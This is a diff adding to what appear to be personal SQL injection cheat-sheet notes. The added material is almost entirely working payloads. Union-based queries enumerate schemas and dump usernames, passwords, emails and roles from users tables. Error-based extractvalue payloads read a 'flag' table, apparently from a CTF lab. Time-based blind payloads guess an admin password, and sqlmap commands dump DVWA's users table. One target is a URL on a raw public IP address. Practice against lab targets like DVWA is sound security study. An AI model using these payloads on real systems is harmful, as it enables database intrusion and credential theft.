@@ -1,3 +1,26 @@
+http://185.84.161.186:8085/support?type=unresolved%27+and+%27A%27=%27A#
+------
+'+or+'A'='A#
+'+union+select+1,2,3,4,5,6,7,8,9,10,11 where 'A'='A#
+'+union+select+*+from+information_schema.tables+where+'A'='A#
+; select * from information_schema.tables where 'a'='a#
+; select * from information_schema.tables#
+; show tables
+; select 1,2 from information_schema.columns#
+union+select+1,2,3,4,5,6+where+'a'=a#
+' UNION SELECT 1,2,3,4,5 FROM support_tickets where 'a'='a#
+' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables where 'a'='a#
+' UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns where table_name+=+'support_tickets#
+' UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns where table_name+=+'users#
+-> id,username,password,email,role,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+' UNION SELECT 1,group_concat(id,username,password,email,role,0x3a),3,4,5,6 FROM users where 'a'='a#
+
+
+
+
+
+========================================================================================================
+
 1.Error-based SQL injection（报错型注入
 2.UNION query SQL injection（可联合查询注入
 3.Boolean-based blind SQL injection（布尔型注入
@@ -22,6 +45,14 @@ cat=1+and+extractvalue(1,concat(':',substr((select+group_concat(cat_id,0x3a,cdes
 +and+extractvalue(1,concat(':',substr((select+group_concat(feature_text,0x3a,pic_id,0x3a)+from+featured),1,31)))
 
 cat=1+and+extractvalue(1,concat(':',(select+group_concat(column_name)+from+information_schema.columns+where+table_name+=+'artists'))
+
+
+*** 1.2 Error based
+1' and extractvalue(1,'^x') -- #
+1' and extractvalue(1,concat(':',database())) -- #                  // database = book
+1' and extractvalue(1,concat(':',(select group_concat(table_name) from information_schema.tables))) -- #        // CHARACTER_SETS,COLLATIONS,COLLA
+1' and extractvalue(1,concat(':',(select group_concat(table_name) from information_schema.tables where table_schema = database()))) -- #        // ':book_list,flag'
+1' and extractvalue(1,concat(':',(select * from flag))) -- #
 
 
 ========================================================================================================
@@ -61,3 +92,36 @@ newsid=999+union+select+1,database(),group_concat(column_name),4,5+from+informat
 case when substr((select password from users where username='admin'),1,1)='p' then sleep(1) else 123 end
 1%20and%20substring(@@version,%201,%201)=8
 1%20and%20case when substring(@@version,%201,%201)=8 then sleep(3) else 123 end
+
+' OR '1'='1'#
+' order by 2 #
+'union select group_concat(table_name), null from information_schema.tables where table_schema = database() #
+'union select group_concat(column_name), null from information_schema.columns where table_name = 'users' #
+'union select user_id, password from users #
+
+========================================================================================================
+DVWA
+
+python3 sqlmap.py \
+    -u "http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit" \
+    --cookie="PHPSESSID=9fje9p9id62qvql64oti9i2vf2; security=low"
+
+python3 sqlmap.py \
+    -u "http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit" \
+    --cookie="PHPSESSID=9fje9p9id62qvql64oti9i2vf2; security=low" \
+    --schema --batch 
+
+python3 sqlmap.py \
+    -u "http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit" \
+    --cookie="PHPSESSID=9fje9p9id62qvql64oti9i2vf2; security=low" \
+    -D dvwa --tables
+
+python3 sqlmap.py \
+    -u "http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit" \
+    --cookie="PHPSESSID=9fje9p9id62qvql64oti9i2vf2; security=low" \
+    --columns -D dvwa -T users
+
+python3 sqlmap.py \
+    -u "http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit" \
+    --cookie="PHPSESSID=9fje9p9id62qvql64oti9i2vf2; security=low" \
+    --dump -D dvwa -T users
